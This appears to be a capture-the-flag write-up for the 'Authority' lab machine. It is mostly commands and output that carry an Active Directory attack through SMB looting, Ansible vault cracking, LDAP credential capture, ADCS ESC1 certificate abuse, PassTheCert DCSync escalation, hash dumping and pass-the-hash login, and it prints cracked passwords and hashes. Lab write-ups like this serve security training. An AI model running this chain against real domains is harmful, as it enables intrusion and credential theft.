### AUTHORITY

```bash
nmap -p- -sSVC --open --min-rate 5000 10.10.11.222  -Pn -nvvv -oN allPorts 

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-02 19:08:47Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
|<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-02T19:09:52+00:00; -3h00m04s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-05-02T19:09:52+00:00; -3h00m04s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
|<SNIP>
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
|<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-02T19:09:52+00:00; -3h00m04s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
|<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-02T19:09:52+00:00; -3h00m04s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/http      syn-ack ttl 127 Apache Tomcat (language: en)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-30T19:03:24
| Not valid after:  2027-05-03T06:41:48
| MD5:   7e6a:189e:8667:4998:671a:a019:b04a:4884
| SHA-1: 9574:1a7c:b025:227e:fdf7:7666:09b6:c236:0d6d:d5eb
| -----BEGIN CERTIFICATE-----
|<SNIP>
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49690/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62338/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62384/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

```


```bash
crackmapexec smb 10.10.11.222 -u 'guest' -p ''
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\guest: 

```

```bash
crackmapexec smb 10.10.11.222 -u 'guest' -p '' --shares
SMB         10.10.11.222    445    AUTHORITY        Share           Permissions     Remark
SMB         10.10.11.222    445    AUTHORITY        -----           -----------     ------
SMB         10.10.11.222    445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.10.11.222    445    AUTHORITY        C$                              Default share
SMB         10.10.11.222    445    AUTHORITY        Department Shares                 
SMB         10.10.11.222    445    AUTHORITY        Development     READ      <<<<<-------------------------    
SMB         10.10.11.222    445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.10.11.222    445    AUTHORITY        NETLOGON                        Logon server share 
SMB         10.10.11.222    445    AUTHORITY        SYSVOL                          Logon server share 
```

```bash
smbclient //10.10.11.222/Development -N 
smb: \> recurse ON
smb: \> prompt off
smb: \> mget *
```

```bash
$ tree
├── PWM
        │   ├── ansible.cfg
        │   ├── ansible_inventory
        │   ├── defaults
        │   │   └── main.yml <---------------------------
        │   ├── handlers
        │   │   └── main.yml
        │   ├── meta
        │   │   └── main.yml
        │   ├── README.md
        │   ├── tasks
        │   │   └── main.yml
        │   └── templates
        │       ├── context.xml.j2
        │       └── tomcat-users.xml.j2
```

```bash
cat defaults/main.yml    
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764                                                               
```

```bash
 ansible2john vault1.vault > hash

```

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (vault1.vault)     
1g 0:00:00:08 DONE (2025-05-03 00:18) 0.1126g/s 4497p/s 4497c/s 4497C/s 051790..prospec

```

```bash
 ansible-vault view vault1.vault 
Vault password: 
svc_pwm
Vault password: 
pWm_@dm!N_!23
Vault password: 
DevT3st@123

```

```bash
nc -lvnp 389
listening on [any] 389 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.222] 49199
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!0P  
```

```bash
crackmapexec winrm 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'    
SMB         10.10.11.222    5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
HTTP        10.10.11.222    5985   AUTHORITY        [*] http://10.10.11.222:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)

```

```bash
smbclient //10.10.11.222/'Department Shares' -U 'svc_ldap%lDaP_1n_th3_cle4r!' 
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
$ tree
── Finance
├── HR
├── IT
├── Marketing
├── Operations
├── R&D
├── Sales

```

```bash
bloodhound-python -c All -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -d authority.htb -dc authority.authority.htb -ns 10.10.11.222 --zip
--------> MemberOF ----------> CERTIFICATE SERVICE DCOM ACCESS
```

```bash
certipy find -vulnerable -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222
[*] Saved BloodHound data to '20250503003813_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250503003813_Certipy.txt'
[*] Saved JSON output to '20250503003813_Certipy.json'
```

```bash
cat 20250503003813_Certipy.json | jq
"[!] Vulnerabilities": {
        "ESC1": "'AUTHORITY.HTB\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication"
      }
```

```bash
certipy req  -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb -dc-ip 10.10.11.222
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 2
Would you like to save the private key? (y/N) N 
```

```bash
"Access Rights": {
          "2": [
            "AUTHORITY.HTB\\Administrators",
            "AUTHORITY.HTB\\Domain Admins",
            "AUTHORITY.HTB\\Enterprise Admins"
          ],

```

```bash
impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -computer-name 'GABRI01' -computer-pass 'Gabri!123' -dc-ip 10.10.11.222
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account GABRI01$ with password Gabri!123.

```

```bash
certipy req  -u GABRI01$ -p 'Gabri!123' -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb -dc-ip 10.10.11.222 -debug
*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

```

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.222
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type) -----> PKINIT Mal Configurado o sin Certificado valido
```
 #### PassTheCert
```bash
openssl pkcs12 -in administrator.pfx -nocerts -out admin.key -nodes
openssl pkcs12 -in administrator.pfx -nokeys -out admin.crt  
```

```bash
git clone https://github.com/AlmondOffSec/PassTheCert.git 
```

```bash
python3 PassTheCert/Python/passthecert.py -action modify_user -crt admin.crt -key admin.key -domain authority.htb -dc-ip 10.10.11.222 -target svc_ldap -elevate
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Granted user 'svc_ldap' DCSYNC rights!

```

```bash
impacket-secretsdump authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'@10.10.11.222               
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::

```

```bash
evil-winrm -i 10.10.11.222 -u administrator -H '6961f422924da90a6928197429eea4ed'
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b3c93cda8669684fd55db1bd0cf1512e

```


